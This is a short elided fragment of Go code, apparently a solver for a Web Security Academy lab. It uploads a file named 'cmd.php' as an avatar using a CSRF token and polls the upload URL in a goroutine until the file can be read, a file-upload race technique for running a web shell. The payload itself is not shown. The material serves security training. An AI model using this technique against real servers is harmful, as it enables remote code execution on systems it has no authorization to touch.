...
func solve() error {
	baseUrl := "https://0a3b0085046436c4c0b4811e002c0030.web-security-academy.net"
	...
	go func(){
		for {
			status, body, _ := get(client, avatarUrl, nil)
			if status == 200 {
				fmt.Println(body)
				return
			}
	...
	err = postAvatar(
		client, changeAvatarUrl, myUser, csrfToken, "cmd.php",
		nil,
